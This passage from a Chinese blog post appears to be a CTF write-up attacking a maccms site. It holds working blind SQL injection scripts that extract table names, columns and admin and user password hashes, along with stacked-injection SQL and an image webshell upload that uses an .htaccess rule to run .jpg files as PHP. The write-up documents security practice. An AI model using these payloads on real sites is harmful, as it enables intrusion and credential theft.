第&quot;</span>+colunms.__str__()+<span class="string">&quot;个字段&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">   <span class="keyword">for</span> position <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):<span class="comment">#表示要查的内容中的第几个字符</span></span><br><span class="line">      ifdone = <span class="number">1</span> <span class="comment">#判断到没到所查字段的长度</span></span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> names:<span class="comment">#遍历字符</span></span><br><span class="line">         query = <span class="string">&quot;&#x27; or ((select substring(table_name,%d,1) from information_schema.tables where table_schema=&#x27;maccms&#x27; LIMIT %d,1)=&#x27;%c&#x27;) #&quot;</span> % (position,colunms,i)</span><br><span class="line">         data = &#123;<span class="string">&quot;user_name&quot;</span>: query, <span class="string">&quot;user_pwd&quot;</span>: <span class="string">&quot;&#x27;&quot;</span>&#125;<span class="comment">#注意,query要先赋值再传进data,不然不能动态赋值的,因为不是引用.</span></span><br><span class="line">         <span class="comment"># print(data)</span></span><br><span class="line">         req = requests.post(url=base,data=data)</span><br><span class="line">         <span class="comment"># print(req.text)</span></span><br><span class="line">         <span class="keyword">if</span> req.text.count(<span class="string">&#x27;用户登录失败&#x27;</span>) == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(i,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            ifdone = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">if</span> ifdone == <span class="number">1</span>:<span class="comment">#如果done=1,说明这轮循环没有字符匹配,则表明爆出了全名</span></span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot; 第&quot;</span>+colunms.__str__()+<span class="string">&quot;个字段完毕&quot;</span>)</span><br><span class="line"></span><br><span class="line"> 第<span class="number">0</span>个字段tsctfj_actor 第<span class="number">0</span>个字段完毕</span><br><span class="line"> 第<span class="number">1</span>个字段tsctfj_admin 第<span class="number">1</span>个字段完毕</span><br><span class="line"> 第<span class="number">2</span>个字段tsctfj_annex 第<span class="number">2</span>个字段完毕</span><br><span class="line"> 第<span class="number">3</span>个字段tsctfj_art 第<span class="number">3</span>个字段完毕</span><br><span class="line"> 第<span class="number">4</span>个字段tsctfj_card 第<span class="number">4</span>个字段完毕</span><br><span class="line"> 第<span class="number">5</span>个字段tsctfj_cash 第<span class="number">5</span>个字段完毕</span><br><span class="line"> 第<span class="number">6</span>个字段tsctfj_cj_content 第<span class="number">6</span>个字段完毕</span><br><span class="line"> 第<span class="number">7</span>个字段tsctfj_cj_history 第<span class="number">7</span>个字段完毕</span><br><span class="line"> 第<span class="number">8</span>个字段tsctfj_cj_node 第<span class="number">8</span>个字段完毕</span><br><span class="line"> 第<span class="number">9</span>个字段tsctfj_collect 第<span class="number">9</span>个字段完毕</span><br><span class="line"> 第<span class="number">10</span>个字段tsctfj_comment 第<span class="number">10</span>个字段完毕</span><br><span class="line"> 第<span class="number">11</span>个字段tsctfj_gbook 第<span class="number">11</span>个字段完毕</span><br><span class="line"> 第<span class="number">12</span>个字段tsctfj_group 第<span class="number">12</span>个字段完毕</span><br><span class="line"> 第<span class="number">13</span>个字段tsctfj_link 第<span class="number">13</span>个字段完毕</span><br><span class="line"> 第<span class="number">14</span>个字段tsctfj_msg 第<span class="number">14</span>个字段完毕</span><br><span class="line"> 第<span class="number">15</span>个字段tsctfj_order 第<span class="number">15</span>个字段完毕</span><br><span class="line"> 第<span class="number">16</span>个字段tsctfj_plog 第<span class="number">16</span>个字段完毕</span><br><span class="line"> 第<span class="number">17</span>个字段tsctfj_role 第<span class="number">17</span>个字段完毕</span><br><span class="line"> 第<span class="number">18</span>个字段tsctfj_topic 第<span class="number">18</span>个字段完毕</span><br><span class="line"> 第<span class="number">19</span>个字段tsctfj_type 第<span class="number">19</span>个字段完毕</span><br><span class="line"> 第<span class="number">20</span>个字段tsctfj_ulog 第<span class="number">20</span>个字段完毕</span><br><span class="line"> 第<span class="number">21</span>个字段tsctfj_user 第<span class="number">21</span>个字段完毕</span><br><span class="line"> 第<span class="number">22</span>个字段tsctfj_visit 第<span class="number">22</span>个字段完毕</span><br><span class="line"> 第<span class="number">23</span>个字段tsctfj_vod 第<span class="number">23</span>个字段完毕</span><br><span class="line"> 第<span class="number">24</span>个字段tsctfj_website 第<span class="number">24</span>个字段完毕</span><br></pre></td></tr></table></div></figure>


        <h2 id="5-爆表里的字段"   >
          <a href="#5-爆表里的字段" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-爆表里的字段" class="headerlink" title="5.爆表里的字段"></a>5.爆表里的字段</h2>
      <p>我们先看一下admin表</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#爆表里的字段名(用information_schema.columns)</span></span><br><span class="line"><span class="keyword">for</span> colunms <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):<span class="comment">#表示要查的内容中的第几个字段</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot; 第&quot;</span>+colunms.__str__()+<span class="string">&quot;个字段&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	<span class="keyword">for</span> position <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):<span class="comment">#表示要查的内容中的第几个字符</span></span><br><span class="line">		ifdone = <span class="number">1</span> <span class="comment">#判断到没到所查字段的长度</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> names:<span class="comment">#遍历字符</span></span><br><span class="line">			query = <span class="string">&quot;&#x27; or ((select substring(COLUMN_NAME,%d,1) from information_schema.columns where table_name=&#x27;tsctfj_admin&#x27;and table_schema=&#x27;maccms&#x27; LIMIT %d,1)=&#x27;%c&#x27;) #&quot;</span> % (position,colunms,i)</span><br><span class="line">			data = &#123;<span class="string">&quot;user_name&quot;</span>: query, <span class="string">&quot;user_pwd&quot;</span>: <span class="string">&quot;&#x27;&quot;</span>&#125;<span class="comment">#注意,query要先赋值再传进data,不然不能动态赋值的,因为不是引用.</span></span><br><span class="line">			<span class="comment"># print(data)</span></span><br><span class="line">			req = requests.post(url=base,data=data)</span><br><span class="line">			<span class="comment"># print(req.text)</span></span><br><span class="line">			<span class="keyword">if</span> req.text.count(<span class="string">&#x27;用户登录失败&#x27;</span>) == <span class="number">1</span>:</span><br><span class="line">				<span class="built_in">print</span>(i,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">				ifdone = <span class="number">0</span></span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">if</span> ifdone == <span class="number">1</span>:<span class="comment">#如果done=1,说明这轮循环没有字符匹配,则表明爆出了全名</span></span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot; 第&quot;</span>+colunms.__str__()+<span class="string">&quot;个字段完毕&quot;</span>)</span><br><span class="line">    </span><br><span class="line"> 第<span class="number">0</span>个字段ADMIN_AUTH 第<span class="number">0</span>个字段完毕</span><br><span class="line"> 第<span class="number">1</span>个字段ADMIN_ID 第<span class="number">1</span>个字段完毕</span><br><span class="line"> 第<span class="number">2</span>个字段ADMIN_LAST_LOGIN_IP 第<span class="number">2</span>个字段完毕</span><br><span class="line"> 第<span class="number">3</span>个字段ADMIN_LAST_LOGIN_TIME 第<span class="number">3</span>个字段完毕</span><br><span class="line"> 第<span class="number">4</span>个字段ADMIN_LOGIN_IP 第<span class="number">4</span>个字段完毕</span><br><span class="line"> 第<span class="number">5</span>个字段ADMIN_LOGIN_NUM 第<span class="number">5</span>个字段完毕</span><br><span class="line"> 第<span class="number">6</span>个字段ADMIN_LOGIN_TIME 第<span class="number">6</span>个字段完毕</span><br><span class="line"> 第<span class="number">7</span>个字段ADMIN_NAME 第<span class="number">7</span>个字段完毕</span><br><span class="line"> 第<span class="number">8</span>个字段ADMIN_PWD 第<span class="number">8</span>个字段完毕</span><br><span class="line"> 第<span class="number">9</span>个字段ADMIN_RANDOM 第<span class="number">9</span>个字段完毕</span><br><span class="line"> 第<span class="number">10</span>个字段ADMIN_STATUS 第<span class="number">10</span>个字段完毕</span><br></pre></td></tr></table></div></figure>




        <h2 id="6-爆数据"   >
          <a href="#6-爆数据" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-爆数据" class="headerlink" title="6.爆数据"></a>6.爆数据</h2>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 爆表信息</span></span><br><span class="line"><span class="keyword">for</span> colunms <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">2</span>):<span class="comment">#表示要查的内容中的第几个字段</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot; 第&quot;</span>+colunms.__str__()+<span class="string">&quot;个字段&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	<span class="keyword">for</span> position <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):<span class="comment">#表示要查的内容中的第几个字符</span></span><br><span class="line">		ifdone = <span class="number">1</span> <span class="comment">#判断到没到所查字段的长度</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> name:<span class="comment">#注意! 一定要用name数组,这里的字符更全.</span></span><br><span class="line">			query = <span class="string">&quot;&#x27; or ((select substring(GROUP_CONCAT(concat_ws(&#x27;,&#x27;,ADMIN_ID,ADMIN_NAME,ADMIN_PWD)),%d,1) FROM maccms.tsctfj_admin LIMIT %d,1)=&#x27;%c&#x27;) #&quot;</span> % (position,colunms,i)</span><br><span class="line">			<span class="comment"># !注意,上面这句如果要一次性把所有字段都输出,那就不能加逗号,因为逗号也会参与判断,而我们的names数组里没有逗号.</span></span><br><span class="line">			data = &#123;<span class="string">&quot;user_name&quot;</span>: query, <span class="string">&quot;user_pwd&quot;</span>: <span class="string">&quot;&#x27;&quot;</span>&#125;<span class="comment">#注意,query要先赋值再传进data,不然不能动态赋值的,因为不是引用.</span></span><br><span class="line">			<span class="comment"># print(data)</span></span><br><span class="line">			req = requests.post(url=base,data=data)</span><br><span class="line">			<span class="comment"># print(req.text)</span></span><br><span class="line">			<span class="keyword">if</span> req.text.count(<span class="string">&#x27;用户登录失败&#x27;</span>) == <span class="number">1</span>:</span><br><span class="line">				<span class="built_in">print</span>(i,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">				ifdone = <span class="number">0</span></span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">if</span> ifdone == <span class="number">1</span>:<span class="comment">#如果done=1,说明这轮循环没有字符匹配,则表明爆出了全名</span></span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot; 第&quot;</span>+colunms.__str__()+<span class="string">&quot;个字段完毕&quot;</span>)</span><br><span class="line">    </span><br><span class="line">第<span class="number">0</span>个字段<span class="number">1</span><span class="string">&#x27;admin&#x27;</span>cbff36039c3d0212b3e34c23dcde1456<span class="string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></div></figure>

<p>这里我没懂为什么一直爆分号…我的分隔符明明是，号</p>
<p>发现admin登不上去，再试一下user</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">USER_NAME,USER_PWD</span><br><span class="line">-》</span><br><span class="line">atestuserintsctf&#x27;j</span><br><span class="line">6568617824e8e70b6ca0a5e6327c873d</span><br><span class="line"></span><br><span class="line">第0个字段atestuserintsctf-j 6568617824e8e70b6ca0a5e6327c873d</span><br></pre></td></tr></table></div></figure>

<p>用户登录成功，登录之后</p>

        <h2 id="7-堆叠注入"   >
          <a href="#7-堆叠注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-堆叠注入" class="headerlink" title="7.堆叠注入"></a>7.堆叠注入</h2>
      <p>登录进去发现积分只有1，没法支付之前那个功能体验，根据提示要去充值，然后去查了一下card表和cash表好像是空表，所以可能自己的积分改不了，那就改需要的积分</p>
<p>判断堆叠注入：</p>
<p>在用户名处构造：</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">atestuserintsctf<span class="operator">-</span>j;<span class="keyword">CREATE</span> <span class="keyword">TABLE</span> aaainject(id <span class="type">int</span>);#</span><br></pre></td></tr></table></div></figure>

<p>然后重新查询表，发现多了一张表，所以有堆叠注入，又因为那个页面的url带着art，所以我们查询art的表，查到了ART_POINTS_DETAIL和ART_POINTS，我们发现它就是那个积分值，把他们改成1，</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update tsctfj_art <span class="keyword">set</span> ART_POINTS_DETAIL <span class="operator">=</span> <span class="number">1</span> <span class="keyword">where</span> ART_POINTS_DETAIL <span class="operator">=</span> <span class="number">4294967295</span></span><br></pre></td></tr></table></div></figure>

<p>然后我们就进入成功啦</p>
<p><img src="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111071743215.png" alt="image-20211105000320009"></p>
<p>后来发现我就1积分，于是又去数据库里发现user里的userpoint是积分，改多了。</p>

        <h2 id="8-图片上传"   >
          <a href="#8-图片上传" class="heading-link"><i class="fas fa-link"></i></a><a href="#8-图片上传" class="headerlink" title="8.图片上传"></a>8.图片上传</h2>
      <p>要get传暗号?tsctf-j_2021_zbr_666=666_rbz_1202_j-ftcst</p>
<p>因为是要开传图片的功能，所以这个get应该是往送图片的请求的加，一开始加到页面上没有用 果然还是太笨惹</p>
<p><img src="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111071743216.png" alt="image-20211105002635107"></p>
<p>在url之后加参数，好像直接就会变成get请求，可能是burpsuite帮我做的或者就是如此</p>
<p>既然明示了图片上传,那就用图片马吧,用copy命令拼接图片马,然后把图片上传, 发现上传成功.</p>
<p><img src="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111071743217.png" alt="image-20211107152347868"></p>
<p>但是此时用蚁剑是连不上的,因为图片仍然被图片格式所解析,无法执行php命令.</p>
<p>所以我们再上传一个.htaccess文件, 这是apache的配置文件,它作用于本目录和所有子目录, 我们上传这样的配置规则:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.jpg&quot;&gt;SetHandler application/x-httpd-php  &lt;/FilesMatch&gt;</span><br></pre></td></tr></table></div></figure>

<p>表示后缀为.jpg的都会被解析为php，这里对htaccess文件类型没有限制，所以上传成功，最后用蚁剑连接成功：</p>
<p><img src="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111071743218.png" alt="image-20211107152310873"></p>
<p>最后终于连接成功,找到了flag</p>
</div></div></article></section><nav class="paginator"><div class="paginator-inner"><span class="page-number current">1</span></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/6.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">↑在现场，我是兔子🐰</p></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/Biscuit19" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="Biscuit19_" target="_blank" rel="noopener" data-popover="微信" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-weixin"></i></span></a><a class="sidebar-ov-social-item" href="https://user.qzone.qq.com/911268514/main" target="_blank" rel="noopener" data-popover="QQ" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-qq"></i></span></a></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">4</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">2</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Biscuit19_</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v5.4.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script></body></html>